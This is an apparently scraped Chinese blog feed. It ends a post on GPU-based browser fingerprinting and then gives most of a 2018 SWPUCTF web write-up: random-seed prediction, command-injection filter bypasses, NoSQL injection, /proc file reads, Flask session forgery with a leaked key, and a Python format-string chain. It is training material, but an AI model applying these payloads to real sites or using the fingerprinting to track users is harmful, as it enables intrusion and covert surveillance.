title="Task(j)-Alpha"></a>Task(j)-Alpha</h2><p>该任务由8个子任务组成，即测试不同alpha值的影响<br>我们将Suzanne和sofa模型平行放置，并且从我们精心设置的alpha值集合<code>{0.09,0.1,011,0.39,0.4,0.41,0.79,1}</code>中选择alpha值，其中0表示完全透明，1表示完全不透明。<br>此时又有两点值得注意，其一，我们精心选择了3个变化不大的值，去反应不同alpha值带来的变化：<code>{0.1,0.4,0.8}</code>，并且值以0.01的速度变化，因为GUPs不能接受更小的步长。其二，因为Suzanne和sofa模型的放置，他们有一部分是重叠的，所以当模型变得透明时，sofa模型被隐藏的部分变得可见。<br>相关代码如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TransparentTest(<span class="keyword">this</span>.combinedVertices, <span class="keyword">this</span>.combinedIndices, <span class="keyword">this</span>.combinedTexCoords, <span class="keyword">this</span>.combinedNormals, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况，因为我们选择了8种alpha值集合，所以得到8组数据<br><img src="/images/2018-12-26-09-59-21.png" alt=""><br><img src="/images/2018-12-26-09-59-35.png" alt=""></p><h2 id="Task-k-复合光"><a href="#Task-k-复合光" class="headerlink" title="Task(k)-复合光"></a>Task(k)-复合光</h2><p>测试复合光特性，例如反射光，移动光，追踪光<br>特别的，我们生成了5000个金属环模型，并以随机的角度将他们放置在地面上，同时堆叠在一起。为了稳定性，我们选择了一个随机数种子用来生成随机数，这样测试即可被重复在不同的浏览器和机器上。两束射向底部的光源，分别是黄色和红色，其一直在整个场景的右上角旋转。当光线照射到金属环的下方，其他的环同时也会被反射光照射，此时两种颜色的光混合在一起。<br>注意，这里我们使用单色光源，因为模型不是彩色的，这样做可以为我们提供更多的相互影响的细节<br>相关代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LightingTest());</span><br></pre></td></tr></table></figure></p><p>运行情况，在第二组里加入了抗锯齿，所以得到了两组数据<br><img src="/images/2018-12-26-10-00-49.png" alt=""><br><img src="/images/2018-12-26-10-01-27.png" alt=""></p><h2 id="更多渲染任务"><a href="#更多渲染任务" class="headerlink" title="更多渲染任务"></a>更多渲染任务</h2><h3 id="Task-l-切面"><a href="#Task-l-切面" class="headerlink" title="Task(l)-切面"></a>Task(l)-切面</h3><p>相关模块为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> ClippingTest());</span><br></pre></td></tr></table></figure></p><p>运行情况<br><img src="/images/2018-12-25-13-43-41.png" alt=""><br><img src="/images/2018-12-25-13-43-57.png" alt=""></p><h3 id="Task-m-立方体纹理和菲涅尔效应"><a href="#Task-m-立方体纹理和菲涅尔效应" class="headerlink" title="Task(m)-立方体纹理和菲涅尔效应"></a>Task(m)-立方体纹理和菲涅尔效应</h3><p>相关代码如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> BubbleTest());</span><br></pre></td></tr></table></figure></p><p>运行情况<br><img src="/images/2018-12-26-10-02-26.png" alt=""><br><img src="/images/2018-12-26-10-02-40.png" alt=""></p><h3 id="Task-n-o-DDS与PVR纹理"><a href="#Task-n-o-DDS与PVR纹理" class="headerlink" title="Task(n/o)-DDS与PVR纹理"></a>Task(n/o)-DDS与PVR纹理</h3><p>相关代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CompressedTextureTest());</span><br></pre></td></tr></table></figure></p><p>运行情况如下，因为有2种纹理(DDS与PVR纹理)，所以得到2组数据<br><img src="/images/2018-12-26-10-04-36.png" alt=""><br><img src="/images/2018-12-26-10-05-06.png" alt=""><br><img src="/images/2018-12-26-10-05-13.png" alt=""></p><h3 id="Task-p-浮点纹理"><a href="#Task-p-浮点纹理" class="headerlink" title="Task(p)-浮点纹理"></a>Task(p)-浮点纹理</h3><p>运行情况如下<br><img src="/images/2018-12-26-10-03-52.png" alt=""><br><img src="/images/2018-12-26-10-03-59.png" alt=""></p><h2 id="Task-r-字符集"><a href="#Task-r-字符集" class="headerlink" title="Task(r)-字符集"></a>Task(r)-字符集</h2><p>为了获取浏览器支持的字符集列表，例如拉丁语，中文或是阿拉伯语。因为目前没有浏览器提供接口去获取其支持的字符集，于是我们想到了一个侧信道的方式去探测，方法如下：<br>每一种字符集都会被浏览器进行渲染，如果该字符集被支持，那么浏览器就会渲染成功。否则，如果字符集不被支持，那么就会渲染出方块。如下图：<br><img src="/images/2018-12-21-09-26-19.png" alt=""><br>我们容易知道在这个被测试的浏览器中，我们容易知道，Javanese，Sudanese，Lontara和Thaana不被支持</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可以看到这些任务深入研究了图片渲染引擎的特征，js没办法直接获取到显卡的设置和驱动，但是通过这种方法，当不同的显卡渲染同一张图片时，因设置不同，渲染出来的图片hash也不同。用这种图片hash作为特征，其实是从侧面得到机器显卡的特征，同一台机器在不同的浏览器上用到同一个显卡，所以可以看到这些task的跨浏览器稳定性都很高，总共10余种task。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>2018SWPUCTF-Web</title>
    <link href="http://skysec.top/2018/12/17/2018SWPUCTF-Web/"/>
    <id>http://skysec.top/2018/12/17/2018SWPUCTF-Web/</id>
    <published>2018-12-17T03:49:22.000Z</published>
    <updated>2018-12-20T06:33:02.671Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知  https://xz.aliyun.com/t/3656</span><br></pre></td></tr></table></figure><h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>随手尝试www.zip<br>发现文件泄露<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后发现题目注册用户登录后，会得到一个优惠码<br><img src="/images/2018-12-17-18-51-32.png" alt=""><br>然而在使用的时候会提示<br><img src="/images/2018-12-17-18-51-52.png" alt=""><br>这就很难受了，明明是15位的优惠码，告诉我要24位的，这里就想到了随机数预测</p><h3 id="种子爆破"><a href="#种子爆破" class="headerlink" title="种子爆破"></a>种子爆破</h3><p>不难发现，虽然我们没有种子，但是我们能得到15个生成的随机数<br>于是使用工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.openwall.com/php_mt_seed/</span><br></pre></td></tr></table></figure></p><p>进行恢复，按照这个思路写出脚本，并按照工具的Input格式进行处理<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'SUjJQvy1e2NyihU'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line"><span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line"><span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str3)):</span><br><span class="line"><span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">res+=str(len(str1)-j)+<span class="string">' '</span>+str(len(str1)-j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p>运行得到结果<br><img src="/images/2018-12-17-18-54-46.png" alt=""><br>我们即可得到满足条件的seed:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seed = 0x016bbc5d = 23837789 (PHP 7.1.0+)</span><br></pre></td></tr></table></figure></p><p>下面容易想到，将题目中的<code>len=15</code>改成<code>len=24</code>，生成优惠码，即可购买成功</p><h3 id="Bypass-RCE"><a href="#Bypass-RCE" class="headerlink" title="Bypass RCE"></a>Bypass RCE</h3><p>购买成功后，跳转到RCE的界面，阅读过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">           <span class="comment">//执行命令</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现必须使用ip的格式，这里使用换行符<code>%0a</code>即可轻松绕过<br>然后是关键词过滤，发现通配符<code>?</code>以及<code>*</code>都被过滤<br>这里想到bypass技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at /fl\ag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-11-50-00.png" alt=""><br>即可拿到flag</p><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>题目提示了<br><img src="/images/2018-12-17-18-46-14.png" alt=""><br>查看下去，发现<br><img src="/images/2018-12-17-18-46-45.png" alt=""><br>猜测题目应该使用了MongoDB</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>尝试测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password[$ne]=\</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-18-47-55.png" alt=""><br>而一般情况下为<br><img src="/images/2018-12-17-18-48-26.png" alt=""><br>那么应该可以判断为NoSQL注入<br>那么进行盲注：<br><img src="/images/2018-12-17-14-36-06.png" alt=""><br>吐槽一下，由于有验证码，而我又不会验证码识别。。。于是只能手动测试：(<br>最后得到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = skmun</span><br></pre></td></tr></table></figure></p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>登录后即可得到flag<br><img src="/images/2018-12-17-14-36-30.png" alt=""></p><h2 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h2><h3 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到题目F12发现关键信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;/static?file=test.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- /source --&gt;</span><br></pre></td></tr></table></figure></p><p>首先确定：<br>1.存在文件包含<br>2.有泄露<br>于是进行查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://107.167.188.241/source</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line">            return abort(404)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure><h3 id="源码读取"><a href="#源码读取" class="headerlink" title="源码读取"></a>源码读取</h3><p>那么思路应该是利用文件包含进行文件读取了<br>但是不能进行目录穿越，于是得先知道绝对路径，这里想到之前HCTF的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/environ</span><br></pre></td></tr></table></figure></p><p>发现500了，应该是没有权限，换个思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/maps</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-13-12-57.png" alt=""><br>发现了python路径，但是看到内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line">            return abort(404)</span><br></pre></td></tr></table></figure></p><p>我们没有办法使用这个绝对路径，尝试了一下bypass，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ctf/web_assli3fasdf/././././app</span><br></pre></td></tr></table></figure></p><p>发现也不行，出题人说用了abspath<br>看来只能想想有没有其他途径读取文件，这里想到如下方法<br>我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/[pid]/cwd是进程当前工作目录的符号链接</span><br></pre></td></tr></table></figure></p><p>既然之前的路径无法用，那么我们可以考虑从proc进行读取，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py</span><br><span class="line">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</span><br></pre></td></tr></table></figure></p><p>这也我们以后进行文件读取，拓宽了一些思路，并且只发现了只有以下文件可以读到，应该是出题人做了限制<br>得到文件内容<br><strong>init</strong>.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure></p><p>views.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure></p><h3 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h3><p>首先从views.py开始审计，发现需要<code>u.balance &gt; 1000000</code>,并且我们又拥有<code>secret_key</code><br>不难想到进行session构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session_cookie_manager.py encode -s &apos;9f516783b42730b7888008dd5c15fe66&apos; -t &quot;&#123;u&apos;count&apos;: 1000000000, u&apos;username&apos;: u&apos;admin&apos;, u&apos;csrf_token&apos;: u&apos;559da19dcf76705bb469aaa42e951440ff338728&apos;, u&apos;balance&apos;: 1000000000.0&#125;&quot;</span><br></pre></td></tr></table></figure></p><p>得到伪造session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxNzTkKgDAURdG9vDpIohmMm5GfCUT9gkMl7t00grc8zb0RaCGOGYOSX40UiNvF5x8rHXsZz23OjAHG-ETKp1icddKEoK0nIt1mb5TWspSu613bQ-A68s601gUorRPjeQGJBCFC.XBd6uw.iqU7NNEiz04SQrIwPwcxbgjplPA</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-18-34-44.png" alt=""></p><h3 id="格式化字符串攻击"><a href="#格式化字符串攻击" class="headerlink" title="格式化字符串攻击"></a>格式化字符串攻击</h3><p>然后就是最后的问题，怎么获取flag，我们看到关键函数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">    field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">    mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">    <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure></p><p>联想到题目提示python3.5以及format，不难想到是格式化字符串的漏洞<br>那么剩下的应该是构造python继承链去读取g.flag<br>这里看到，我们的可控点是拼接在g.u后面的，所以我们需要上跳<br>而这里需要先知道g是什么：<br><img src="/images/2018-12-17-18-36-16.png" alt=""><br>很明显，如果我们需要读取g的值，我们需要一直上跳到app<br>而目前我们处于<br><img src="/images/2018-12-17-18-37-25.png" alt=""><br>很显然，结合<em>_init</em>.py，我们应该先跳到db，再跳到app<br>这里题目提示我们<br><img src="/images/2018-12-17-18-39-52.png" alt=""><br>于是我们尝试这个类中的save方法<br><img src="/images/2018-12-17-18-40-51.png" alt=""><br>可以发现db,于是我们继续上跳<br><img src="/images/2018-12-17-18-41-54.png" alt=""><br>发现存在<code>current_app</code><br>紧接着受到源码的启发<br><img src="/images/2018-12-17-18-43-39.png" alt=""><br>我们可以继续调用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-18-44-14.png" alt=""><br>不难发现找到了g，我们查看flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-18-44-51.png" alt=""><br>得到flag：<code>swpuctf{tHl$_15_4_f14G}</code></p><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><h3 id="信息搜集-3"><a href="#信息搜集-3" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>看了一下文件的功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读文件</span><br><span class="line">http://120.79.158.180:11115/file.php?file=</span><br><span class="line">上传文件</span><br><span class="line">http://120.79.158.180:11115/upload_file.php</span><br></pre></td></tr></table></figure></p><p>于是尝试Leak一下源码<br><figure class="highlight 